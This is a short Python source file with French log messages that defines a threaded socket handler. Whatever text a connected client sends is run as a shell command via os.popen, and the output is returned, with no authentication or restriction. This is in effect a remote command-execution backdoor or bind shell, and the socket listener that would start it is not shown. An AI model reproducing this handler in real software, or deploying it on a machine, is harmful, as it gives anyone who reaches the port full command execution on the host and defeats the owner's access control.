#!/usr/bin/env python3.4
# coding: utf-8

import sys,socket,os,threading

class ClientThread(threading.Thread):
	
	def __init__(self, ip, port, clientsocket):
		
		threading.Thread.__init__(self)
		self.ip = ip
		self.port = port
		self.clientsocket = clientsocket
		print('## Nouveau thread pour ', self.ip,': ', self.port)
	def run(self):
		data = " "
		while data != "exit":
		
			data = self.clientsocket.recv(2048)
			
			rep = os.popen(data.decode())
			self.clientsocket.send(rep.read().encode())
		print('Fin du thread ', self.port)

